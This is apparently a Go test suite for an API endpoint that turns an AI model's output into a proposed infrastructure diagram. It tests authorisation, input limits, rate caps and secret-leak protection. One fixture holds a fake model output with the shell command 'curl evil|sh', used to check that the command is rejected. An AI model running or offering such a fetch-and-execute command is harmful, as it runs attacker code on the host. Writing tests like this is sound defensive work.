package main

import (
	"context"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"regexp"
	"strings"
	"testing"
	"time"

	"api/aigen"
	"api/catalog"
)

// aiTestEnv swaps in a fake generator and fresh limits, restoring everything
// afterwards. CI never reaches a network.
func aiTestEnv(t *testing.T, gen aigen.Generator) {
	t.Helper()
	withTestDB(t)
	oldGen, oldLimiter, oldCap, oldTimeout := aiGenerator, aiLimiter, aiDailyCap, aiTimeout
	aiGenerator = gen
	aiLimiter = NewRateLimiter(100, time.Minute, 100)
	t.Cleanup(func() { aiGenerator, aiLimiter, aiDailyCap, aiTimeout = oldGen, oldLimiter, oldCap, oldTimeout })

	seedUser(t, "u_owner", "owner@test.com")
	seedUser(t, "u_viewer", "viewer@test.com")
	seedUser(t, "u_stranger", "stranger@test.com")
	seedTeamWithProject(t, "team_ai", "u_owner", "proj_ai", "u_owner")
	if _, err := db.Exec("INSERT INTO project_members (id, project_id, user_id, role, added_by) VALUES ('pm_v', 'proj_ai', 'u_viewer', 'VIEWER', 'u_owner')"); err != nil {
		t.Fatal(err)
	}
}

// aiCall runs the real handler behind the same role gate main.go applies.
func aiCall(userID, projectID, body string) *httptest.ResponseRecorder {
	mux := http.NewServeMux()
	mux.Handle("POST /api/projects/{id}/ai/generate", RequireProjectRole("EDITOR")(http.HandlerFunc(handleAIGenerate)))
	r := httptest.NewRequest(http.MethodPost, "/api/projects/"+projectID+"/ai/generate", strings.NewReader(body))
	if userID != "" {
		r = asUser(r, userID)
	}
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, r)
	return w
}

func fakeGraph(raw string) *aigen.FakeGenerator {
	return &aigen.FakeGenerator{Output: json.RawMessage(raw), Usage: aigen.Usage{InputTokens: 100, OutputTokens: 50}}
}

const goodGraph = `{"nodes":[
	{"ref":"net","type":"aws_vpc"},
	{"ref":"vm","type":"aws_instance.web_server"},
	{"ref":"web","type":"nginx"}],
 "edges":[{"source":"vm","target":"web"}]}`

func usageRows(t *testing.T) (n int, outcomes string) {
	t.Helper()
	rows, err := db.Query("SELECT outcome FROM ai_generations ORDER BY id")
	if err != nil {
		t.Fatal(err)
	}
	defer rows.Close()
	var out []string
	for rows.Next() {
		var o string
		rows.Scan(&o)
		out = append(out, o)
	}
	return len(out), strings.Join(out, ",")
}

func canvasNodes(t *testing.T, projectID string) string {
	t.Helper()
	var s string
	if err := db.QueryRow("SELECT nodes_json FROM canvas_states WHERE project_id = ?", projectID).Scan(&s); err != nil {
		t.Fatal(err)
	}
	return s
}

func TestAIGenerateSuccessReturnsProposalWithoutSaving(t *testing.T) {
	gen := fakeGraph(goodGraph)
	aiTestEnv(t, gen)

	w := aiCall("u_owner", "proj_ai", `{"prompt":"a web server running nginx"}`)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var resp struct {
		Nodes    []map[string]any `json:"nodes"`
		Edges    []map[string]any `json:"edges"`
		Warnings []map[string]any `json:"warnings"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	if len(resp.Nodes) != 3 || len(resp.Edges) != 1 {
		t.Fatalf("got %d nodes, %d edges", len(resp.Nodes), len(resp.Edges))
	}
	for _, n := range resp.Nodes {
		pos := n["position"].(map[string]any)
		if pos["x"].(float64) == 0 && pos["y"].(float64) == 0 {
			t.Errorf("node %v was not laid out", n["id"])
		}
	}
	if resp.Warnings == nil {
		t.Error("warnings must be an array, not null")
	}

	// Generate-only: the canvas is untouched.
	if got := canvasNodes(t, "proj_ai"); got != "[]" {
		t.Errorf("canvas was modified: %s", got)
	}
	// The model got the prompt and the catalog schema, nothing from the project.
	reqs := gen.Requests()
	if len(reqs) != 1 || reqs[0].Prompt != "a web server running nginx" || reqs[0].Schema == nil {
		t.Errorf("unexpected provider request: %+v", reqs)
	}
	if n, outcomes := usageRows(t); n != 1 || outcomes != "success" {
		t.Errorf("usage rows = %d (%s)", n, outcomes)
	}
	var in, out int
	db.QueryRow("SELECT input_tokens, output_tokens FROM ai_generations").Scan(&in, &out)
	if in != 100 || out != 50 {
		t.Errorf("tokens not recorded: %d/%d", in, out)
	}
}

func TestAIGeneratePlacesProposalBelowExistingCanvasWithoutSendingItToTheModel(t *testing.T) {
	gen := fakeGraph(goodGraph)
	aiTestEnv(t, gen)
	existing := `[{"id":"nginx_1","type":"customNode","position":{"x":100,"y":900},"data":{"label":"SECRET-LABEL","tech":"Ansible","parameters":{"dbPass":"hunter2"}}}]`
	db.Exec("UPDATE canvas_states SET nodes_json = ? WHERE project_id = 'proj_ai'", existing)

	w := aiCall("u_owner", "proj_ai", `{"prompt":"nginx please"}`)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var resp struct {
		Nodes []struct {
			ID       string
			Position struct{ X, Y float64 }
		}
	}
	json.Unmarshal(w.Body.Bytes(), &resp)
	if len(resp.Nodes) != 3 {
		t.Fatalf("existing nodes leaked into the proposal: %d nodes", len(resp.Nodes))
	}
	ids := map[string]bool{}
	for _, n := range resp.Nodes {
		ids[n.ID] = true
		if n.ID == "nginx_1" {
			t.Errorf("proposed ID collides with an existing node")
		}
		if n.Position.Y <= 900 {
			t.Errorf("node %s placed at y=%v, overlapping the existing canvas", n.ID, n.Position.Y)
		}
	}
	for _, e := range gen.Requests() {
		if strings.Contains(e.Prompt, "SECRET") || strings.Contains(e.Prompt, "hunter2") {
			t.Error("canvas content reached the model")
		}
	}
	if got := canvasNodes(t, "proj_ai"); got != existing {
		t.Errorf("canvas was modified: %s", got)
	}
}

func TestAIGenerateRejectsUnauthorisedCallers(t *testing.T) {
	gen := fakeGraph(goodGraph)
	aiTestEnv(t, gen)

	for name, c := range map[string]struct {
		user, project string
		want          int
	}{
		"anonymous":    {"", "proj_ai", http.StatusUnauthorized},
		"viewer":       {"u_viewer", "proj_ai", http.StatusForbidden},
		"non-member":   {"u_stranger", "proj_ai", http.StatusForbidden},
		"no such proj": {"u_owner", "proj_nope", http.StatusNotFound},
	} {
		t.Run(name, func(t *testing.T) {
			w := aiCall(c.user, c.project, `{"prompt":"x"}`)
			if w.Code != c.want {
				t.Errorf("expected %d, got %d", c.want, w.Code)
			}
		})
	}
	if len(gen.Requests()) != 0 {
		t.Error("the model was called for an unauthorised request")
	}
	if n, _ := usageRows(t); n != 0 {
		t.Error("usage recorded for an unauthorised request")
	}
}

func TestAIGenerateIsRegisteredBehindEditorRole(t *testing.T) {
	src, err := os.ReadFile("main.go")
	if err != nil {
		t.Skip("main.go not readable")
	}
	re := regexp.MustCompile(`POST /api/projects/\{id\}/ai/generate", AuthMiddleware\(RequireProjectRole\("EDITOR"\)\(http\.HandlerFunc\(handleAIGenerate\)\)\)\)`)
	if !re.Match(src) {
		t.Error("the ai/generate route must be wrapped in AuthMiddleware and RequireProjectRole(\"EDITOR\")")
	}
}

func TestAIGenerateDisabled(t *testing.T) {
	aiTestEnv(t, nil)
	aiGenerator = nil
	w := aiCall("u_owner", "proj_ai", `{"prompt":"x"}`)
	if w.Code != http.StatusNotFound {
		t.Errorf("expected 404 when disabled, got %d", w.Code)
	}
	if n, _ := usageRows(t); n != 0 {
		t.Error("usage recorded while disabled")
	}
}

func TestAIGenerateRequestValidation(t *testing.T) {
	gen := fakeGraph(goodGraph)
	aiTestEnv(t, gen)
	tooLong := strings.Repeat("a", catalog.MaxPromptLen+1)
	atLimit := strings.Repeat("é", catalog.MaxPromptLen) // limit is characters, not bytes

	for name, c := range map[string]struct {
		body string
		want int
	}{
		"empty body":        {``, http.StatusBadRequest},
		"not json":          {`prompt=hello`, http.StatusBadRequest},
		"empty prompt":      {`{"prompt":""}`, http.StatusBadRequest},
		"whitespace prompt": {`{"prompt":"   \n\t "}`, http.StatusBadRequest},
		"unknown field":     {`{"prompt":"x","canvas":[]}`, http.StatusBadRequest},
		"prompt not string": {`{"prompt":5}`, http.StatusBadRequest},
		"too long":          {`{"prompt":"` + tooLong + `"}`, http.StatusBadRequest},
		"huge body":         {`{"prompt":"` + strings.Repeat("a", aiMaxBodyBytes) + `"}`, http.StatusBadRequest},
		"exactly the limit": {`{"prompt":"` + atLimit + `"}`, http.StatusOK},
		"multi-line prompt": {`{"prompt":"line one\nline two"}`, http.StatusOK},
	} {
		t.Run(name, func(t *testing.T) {
			w := aiCall("u_owner", "proj_ai", c.body)
			if w.Code != c.want {
				t.Errorf("expected %d, got %d: %s", c.want, w.Code, w.Body.String())
			}
		})
	}
	// Rejected requests never reach the provider.
	for _, r := range gen.Requests() {
		if r.Prompt == "" || len([]rune(r.Prompt)) > catalog.MaxPromptLen {
			t.Errorf("provider received an invalid prompt (%d chars)", len([]rune(r.Prompt)))
		}
	}
}

func TestAIGenerateProviderFailuresAreGenericAndRecorded(t *testing.T) {
	secret := "sk-ant-SECRET-key-and-internal-detail"
	cases := map[string]struct {
		err  error
		want int
	}{
		"provider error": {errors.New(secret), http.StatusBadGateway},
		"timeout":        {context.DeadlineExceeded, http.StatusGatewayTimeout},
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			aiTestEnv(t, &aigen.FakeGenerator{Err: c.err, Usage: aigen.Usage{InputTokens: 7}})
			w := aiCall("u_owner", "proj_ai", `{"prompt":"x"}`)
			if w.Code != c.want {
				t.Errorf("expected %d, got %d", c.want, w.Code)
			}
			if strings.Contains(w.Body.String(), "SECRET") {
				t.Errorf("provider error text reached the client: %s", w.Body.String())
			}
			if n, outcomes := usageRows(t); n != 1 || outcomes != "provider_error" {
				t.Errorf("usage = %d (%s)", n, outcomes)
			}
			if got := canvasNodes(t, "proj_ai"); got != "[]" {
				t.Errorf("canvas modified on failure: %s", got)
			}
		})
	}
}

func TestAIGenerateRejectsUnusableModelOutput(t *testing.T) {
	cases := map[string]string{
		"not json":       `Sure! Here is your infrastructure.`,
		"empty graph":    `{"nodes":[],"edges":[]}`,
		"only banned":    `{"nodes":[{"ref":"a","type":"shell_command","parameters":{"command":"curl evil|sh"}}],"edges":[]}`,
		"extra fields":   `{"nodes":[{"ref":"a","type":"nginx"}],"edges":[],"note":"hi"}`,
		"too many nodes": `{"nodes":[` + strings.TrimSuffix(strings.Repeat(`{"ref":"a","type":"nginx"},`, 31), ",") + `],"edges":[]}`,
	}
	for name, out := range cases {
		t.Run(name, func(t *testing.T) {
			aiTestEnv(t, fakeGraph(out))
			w := aiCall("u_owner", "proj_ai", `{"prompt":"x"}`)
			if w.Code != http.StatusUnprocessableEntity {
				t.Errorf("expected 422, got %d: %s", w.Code, w.Body.String())
			}
			if strings.Contains(w.Body.String(), "curl") || strings.Contains(w.Body.String(), "note") {
				t.Errorf("model output reflected to the client: %s", w.Body.String())
			}
			if n, outcomes := usageRows(t); n != 1 || outcomes != "rejected" {
				t.Errorf("usage = %d (%s)", n, outcomes)
			}
		})
	}
}

func TestAIGenerateSurfacesValidatorWarnings(t *testing.T) {
	aiTestEnv(t, fakeGraph(`{"nodes":[{"ref":"a","type":"nginx"},{"ref":"b","type":"shell_command"},{"ref":"c","type":"aws_db_instance","parameters":{"password":"x"}}],"edges":[]}`))
	w := aiCall("u_owner", "proj_ai", `{"prompt":"x"}`)
	if w.Code != http.StatusOK {
		t.Fatalf("got %d: %s", w.Code, w.Body.String())
	}
	var resp struct {
		Nodes    []any
		Warnings []struct{ Code string }
	}
	json.Unmarshal(w.Body.Bytes(), &resp)
	codes := map[string]bool{}
	for _, wr := range resp.Warnings {
		codes[wr.Code] = true
	}
	if len(resp.Nodes) != 2 || !codes["restricted_type"] || !codes["parameter_not_settable"] {
		t.Errorf("nodes=%d warnings=%v", len(resp.Nodes), codes)
	}
}

func TestAIGenerateRateLimits(t *testing.T) {
	t.Run("burst limit", func(t *testing.T) {
		gen := fakeGraph(goodGraph)
		aiTestEnv(t, gen)
		aiLimiter = NewRateLimiter(2, time.Hour, 2)
		for i, want := range []int{200, 200, 429} {
			if w := aiCall("u_owner", "proj_ai", `{"prompt":"x"}`); w.Code != want {
				t.Errorf("request %d: expected %d, got %d", i+1, want, w.Code)
			}
		}
		if len(gen.Requests()) != 2 {
			t.Errorf("provider called %d times, want 2", len(gen.Requests()))
		}
	})

	t.Run("daily cap counts failures and is per user", func(t *testing.T) {
		gen := &aigen.FakeGenerator{Err: errors.New("down")}
		aiTestEnv(t, gen)
		aiDailyCap = 3
		for i := 0; i < 3; i++ {
			if w := aiCall("u_owner", "proj_ai", `{"prompt":"x"}`); w.Code != http.StatusBadGateway {
				t.Fatalf("attempt %d: got %d", i+1, w.Code)
			}
		}
		if w := aiCall("u_owner", "proj_ai", `{"prompt":"x"}`); w.Code != http.StatusTooManyRequests {
			t.Errorf("4th attempt: expected 429, got %d", w.Code)
		}
		if len(gen.Requests()) != 3 {
			t.Errorf("provider called %d times, want 3", len(gen.Requests()))
		}
		// Another user is unaffected.
		db.Exec("INSERT INTO project_members (id, project_id, user_id, role, added_by) VALUES ('pm_e', 'proj_ai', 'u_viewer', 'EDITOR', 'u_owner') ON CONFLICT DO NOTHING")
		db.Exec("UPDATE project_members SET role = 'EDITOR' WHERE id = 'pm_v'")
		if w := aiCall("u_viewer", "proj_ai", `{"prompt":"x"}`); w.Code == http.StatusTooManyRequests {
			t.Error("one user's usage counted against another")
		}
	})

	t.Run("old usage falls out of the window", func(t *testing.T) {
		aiTestEnv(t, fakeGraph(goodGraph))
		aiDailyCap = 2
		for i := 0; i < 2; i++ {
			db.Exec("INSERT INTO ai_generations (id, user_id, project_id, outcome, created_at) VALUES (?, 'u_owner', 'proj_ai', 'success', datetime('now', '-25 hours'))", "old"+string(rune('a'+i)))
		}
		if w := aiCall("u_owner", "proj_ai", `{"prompt":"x"}`); w.Code != http.StatusOK {
			t.Errorf("usage older than 24h blocked a request: %d", w.Code)
		}
	})
}

func TestAIStatus(t *testing.T) {
	aiTestEnv(t, aigen.Mock{})
	call := func(user string) (int, map[string]any) {
		r := httptest.NewRequest(http.MethodGet, "/api/ai/status", nil)
		if user != "" {
			r = asUser(r, user)
		}
		w := httptest.NewRecorder()
		handleAIStatus(w, r)
		var out map[string]any
		json.Unmarshal(w.Body.Bytes(), &out)
		return w.Code, out
	}
	if code, _ := call(""); code != http.StatusUnauthorized {
		t.Errorf("anonymous: %d", code)
	}
	if code, out := call("u_owner"); code != 200 || out["enabled"] != true {
		t.Errorf("enabled: %d %v", code, out)
	}
	aiGenerator = nil
	if _, out := call("u_owner"); out["enabled"] != false {
		t.Errorf("disabled: %v", out)
	}
}

func TestInitAIMode(t *testing.T) {
	env := func(m map[string]string) func(string) string { return func(k string) string { return m[k] } }
	oldGen, oldModel, oldCap, oldTimeout := aiGenerator, aiModel, aiDailyCap, aiTimeout
	t.Cleanup(func() { aiGenerator, aiModel, aiDailyCap, aiTimeout = oldGen, oldModel, oldCap, oldTimeout })

	cases := []struct {
		name    string
		env     map[string]string
		enabled bool
	}{
		{"unset", map[string]string{}, false},
		{"flag false", map[string]string{"AI_MODE_ENABLED": "false", "ANTHROPIC_API_KEY": "k"}, false},
		{"flag true, no key", map[string]string{"AI_MODE_ENABLED": "true"}, false},
		{"flag true, key", map[string]string{"AI_MODE_ENABLED": "true", "ANTHROPIC_API_KEY": "k"}, true},
		{"key alone does not enable", map[string]string{"ANTHROPIC_API_KEY": "k"}, false},
		{"mock", map[string]string{"AI_MODE_ENABLED": "true", "AI_PROVIDER": "mock"}, true},
		{"mock without the flag", map[string]string{"AI_PROVIDER": "mock"}, false},
		{"unknown provider", map[string]string{"AI_MODE_ENABLED": "true", "AI_PROVIDER": "gpt", "ANTHROPIC_API_KEY": "k"}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			initAIMode(env(c.env))
			if (aiGenerator != nil) != c.enabled {
				t.Errorf("enabled = %v, want %v", aiGenerator != nil, c.enabled)
			}
		})
	}

	initAIMode(env(map[string]string{"AI_MODE_ENABLED": "true", "AI_PROVIDER": "mock", "AI_DAILY_CAP": "7", "AI_TIMEOUT_SECONDS": "12", "AI_MODEL": "m"}))
	if aiDailyCap != 7 || aiTimeout != 12*time.Second || aiModel != "m" {
		t.Errorf("env not applied: cap=%d timeout=%v model=%s", aiDailyCap, aiTimeout, aiModel)
	}
}

// The mock provider feeds the same validator as a real model, so its output
// must be a clean, usable graph for a range of prompts.
func TestMockProviderOutputValidates(t *testing.T) {
	for _, prompt := range []string{"a web app", "node api with a postgres database and an s3 bucket", "static site", "x"} {
		out, _, err := aigen.Mock{}.Generate(context.Background(), aigen.GenerateRequest{Prompt: prompt})
		if err != nil {
			t.Fatal(err)
		}
		res, err := aigen.Validate(out)
		if err != nil {
			t.Fatalf("%q: %v", prompt, err)
		}
		for _, w := range res.Warnings {
			t.Errorf("%q: mock output produced warning %+v", prompt, w)
		}
	}
}

// countingReader yields an endless JSON string and counts what was consumed.
type countingReader struct {
	sent   int
	header string
}

func (c *countingReader) Read(p []byte) (int, error) {
	if c.sent == 0 && c.header != "" {
		n := copy(p, c.header)
		c.sent += n
		return n, nil
	}
	if c.sent > 8<<20 {
		return 0, io.EOF
	}
	for i := range p {
		p[i] = 'a'
	}
	c.sent += len(p)
	return len(p), nil
}

// A request body must be cut off at the limit, not buffered whole.
func TestAIGenerateStopsReadingOversizedBodies(t *testing.T) {
	aiTestEnv(t, fakeGraph(goodGraph))
	body := &countingReader{header: `{"prompt":"`}
	mux := http.NewServeMux()
	mux.Handle("POST /api/projects/{id}/ai/generate", RequireProjectRole("EDITOR")(http.HandlerFunc(handleAIGenerate)))
	r := asUser(httptest.NewRequest(http.MethodPost, "/api/projects/proj_ai/ai/generate", body), "u_owner")
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, r)

	if w.Code != http.StatusBadRequest {
		t.Errorf("expected 400, got %d", w.Code)
	}
	if body.sent > 4*aiMaxBodyBytes {
		t.Errorf("handler read %d bytes of an unbounded body; the limit is %d", body.sent, aiMaxBodyBytes)
	}
}

// If the usage log cannot be read, the cost control cannot be checked, so the
// request must be refused rather than allowed through.
func TestAIGenerateFailsClosedWhenCapCannotBeChecked(t *testing.T) {
	gen := fakeGraph(goodGraph)
	aiTestEnv(t, gen)
	if _, err := db.Exec("DROP TABLE ai_generations"); err != nil {
		t.Fatal(err)
	}
	w := aiCall("u_owner", "proj_ai", `{"prompt":"x"}`)
	if w.Code != http.StatusTooManyRequests {
		t.Errorf("expected 429, got %d", w.Code)
	}
	if len(gen.Requests()) != 0 {
		t.Error("the model was called although the daily cap could not be checked")
	}
}

// A proposal added to a canvas that already uses a name must not reuse it:
// the generators emit duplicate Terraform resource labels otherwise.
func TestAIGenerateAvoidsNamesAlreadyOnTheCanvas(t *testing.T) {
	aiTestEnv(t, fakeGraph(`{"nodes":[{"ref":"net","type":"aws_vpc"}],"edges":[]}`))
	db.Exec(`UPDATE canvas_states SET nodes_json = ? WHERE project_id = 'proj_ai'`,
		`[{"id":"aws_vpc_1","type":"customNode","position":{"x":0,"y":0},"data":{"parameters":{"vpcName":"app_vpc"}}}]`)

	w := aiCall("u_owner", "proj_ai", `{"prompt":"a network"}`)
	if w.Code != http.StatusOK {
		t.Fatalf("got %d: %s", w.Code, w.Body.String())
	}
	var resp struct {
		Nodes []struct {
			Data struct{ Parameters map[string]any }
		}
		Warnings []struct{ Code string }
	}
	json.Unmarshal(w.Body.Bytes(), &resp)
	if len(resp.Nodes) != 1 || resp.Nodes[0].Data.Parameters["vpcName"] != "app_vpc_2" {
		t.Errorf("proposal reused an existing name: %+v", resp.Nodes)
	}
	if len(resp.Warnings) != 1 || resp.Warnings[0].Code != "renamed" {
		t.Errorf("warnings = %+v", resp.Warnings)
	}
}

func TestAIGenerateWorksOnAProjectWithNoCanvasRow(t *testing.T) {
	aiTestEnv(t, fakeGraph(goodGraph))
	db.Exec("DELETE FROM canvas_states WHERE project_id = 'proj_ai'")
	if w := aiCall("u_owner", "proj_ai", `{"prompt":"x"}`); w.Code != http.StatusOK {
		t.Errorf("got %d: %s", w.Code, w.Body.String())
	}
}

func TestInitAIModeSelectsTheProviderAndItsOwnModelDefault(t *testing.T) {
	env := func(m map[string]string) func(string) string { return func(k string) string { return m[k] } }
	oldGen, oldModel := aiGenerator, aiModel
	t.Cleanup(func() { aiGenerator, aiModel = oldGen, oldModel })

	on := map[string]string{"AI_MODE_ENABLED": "true"}
	with := func(extra map[string]string) map[string]string {
		m := map[string]string{}
		for k, v := range on {
			m[k] = v
		}
		for k, v := range extra {
			m[k] = v
		}
		return m
	}

	t.Run("gemini needs its own key", func(t *testing.T) {
		initAIMode(env(with(map[string]string{"AI_PROVIDER": "gemini"})))
		if aiGenerator != nil {
			t.Error("enabled without GEMINI_API_KEY")
		}
		initAIMode(env(with(map[string]string{"AI_PROVIDER": "gemini", "ANTHROPIC_API_KEY": "k"})))
		if aiGenerator != nil {
			t.Error("an Anthropic key must not enable the Gemini provider")
		}
		initAIMode(env(with(map[string]string{"GEMINI_API_KEY": "k"})))
		if aiGenerator != nil {
			t.Error("a Gemini key must not enable the default (Claude) provider")
		}
	})

	t.Run("gemini with a key uses the Gemini default model", func(t *testing.T) {
		initAIMode(env(with(map[string]string{"AI_PROVIDER": "Gemini", "GEMINI_API_KEY": "k", "AI_MAX_OUTPUT_TOKENS": "2048", "GEMINI_BASE_URL": "http://stub"})))
		g, ok := aiGenerator.(*aigen.Gemini)
		if !ok {
			t.Fatalf("got %T", aiGenerator)
		}
		if g.Model != aigen.DefaultGeminiModel || aiModel != aigen.DefaultGeminiModel || g.MaxTokens != 2048 || g.BaseURL != "http://stub" || g.APIKey != "k" {
			t.Errorf("%+v / %s", g, aiModel)
		}
	})

	t.Run("AI_MODEL overrides the default", func(t *testing.T) {
		initAIMode(env(with(map[string]string{"AI_PROVIDER": "gemini", "GEMINI_API_KEY": "k", "AI_MODEL": "gemini-other"})))
		if g := aiGenerator.(*aigen.Gemini); g.Model != "gemini-other" || aiModel != "gemini-other" {
			t.Errorf("%+v / %s", g, aiModel)
		}
	})

	t.Run("switching providers does not carry the model over", func(t *testing.T) {
		initAIMode(env(with(map[string]string{"AI_PROVIDER": "gemini", "GEMINI_API_KEY": "k"})))
		initAIMode(env(with(map[string]string{"ANTHROPIC_API_KEY": "k"})))
		if c, ok := aiGenerator.(*aigen.Claude); !ok || c.Model != defaultAIModel || aiModel != defaultAIModel {
			t.Errorf("claude after gemini kept %q", aiModel)
		}
		if c := aiGenerator.(*aigen.Claude); c.MaxTokens != 0 {
			t.Errorf("an unset AI_MAX_OUTPUT_TOKENS must leave the provider default, got %d", c.MaxTokens)
		}
	})

	t.Run("usage rows name the mock, not a real model", func(t *testing.T) {
		initAIMode(env(with(map[string]string{"AI_PROVIDER": "mock"})))
		if aiModel != "mock" {
			t.Errorf("aiModel = %q", aiModel)
		}
	})
}

func TestAIGenerateReturnsTheModelsNotesWithAProposal(t *testing.T) {
	aiTestEnv(t, fakeGraph(`{"nodes":[{"ref":"a","type":"nginx"}],"edges":[],"notes":["Kubernetes is not available, so it is not included."]}`))
	w := aiCall("u_owner", "proj_ai", `{"prompt":"x"}`)
	if w.Code != http.StatusOK {
		t.Fatalf("got %d: %s", w.Code, w.Body.String())
	}
	var resp struct{ Notes []string }
	json.Unmarshal(w.Body.Bytes(), &resp)
	if len(resp.Notes) != 1 || !strings.Contains(resp.Notes[0], "Kubernetes") {
		t.Errorf("notes = %q", resp.Notes)
	}
}

func TestAIGenerateAlwaysSendsANotesList(t *testing.T) {
	aiTestEnv(t, fakeGraph(`{"nodes":[{"ref":"a","type":"nginx"}],"edges":[]}`))
	w := aiCall("u_owner", "proj_ai", `{"prompt":"x"}`)
	if !strings.Contains(w.Body.String(), `"notes":[]`) {
		t.Errorf("a client should always get a list: %s", w.Body.String())
	}
}

func TestAIGenerateShowsNotesWhenNothingCouldBeBuilt(t *testing.T) {
	aiTestEnv(t, fakeGraph(`{"nodes":[],"edges":[],"notes":["Google Cloud is not available."]}`))
	w := aiCall("u_owner", "proj_ai", `{"prompt":"x"}`)
	if w.Code != http.StatusUnprocessableEntity {
		t.Fatalf("got %d: %s", w.Code, w.Body.String())
	}
	var resp struct {
		Error string
		Notes []string
	}
	json.Unmarshal(w.Body.Bytes(), &resp)
	if resp.Error == "" || len(resp.Notes) != 1 || resp.Notes[0] != "Google Cloud is not available." {
		t.Errorf("body = %s", w.Body.String())
	}
	if n, outcomes := usageRows(t); n != 1 || outcomes != "rejected" {
		t.Errorf("usage = %d (%s)", n, outcomes)
	}
	if got := canvasNodes(t, "proj_ai"); got != "[]" {
		t.Errorf("canvas modified: %s", got)
	}
}

func TestAIGenerateGivesNoNotesForStructuralFailures(t *testing.T) {
	// When the output is not a valid document nothing in it, notes included, is trusted.
	aiTestEnv(t, fakeGraph(`{"nodes":[{"ref":"a","type":"nginx"}],"edges":[],"extra":1,"notes":["Visit the site."]}`))
	w := aiCall("u_owner", "proj_ai", `{"prompt":"x"}`)
	if w.Code != http.StatusUnprocessableEntity {
		t.Fatalf("got %d", w.Code)
	}
	if strings.Contains(w.Body.String(), "Visit") || strings.Contains(w.Body.String(), `"notes"`) {
		t.Errorf("notes from a rejected document reached the client: %s", w.Body.String())
	}
}

func TestMockProviderSaysWhatItLeftOut(t *testing.T) {
	aiTestEnv(t, aigen.Mock{})
	w := aiCall("u_owner", "proj_ai", `{"prompt":"a web server on kubernetes"}`)
	if w.Code != http.StatusOK || !strings.Contains(w.Body.String(), "Kubernetes") {
		t.Errorf("got %d: %s", w.Code, w.Body.String())
	}
}
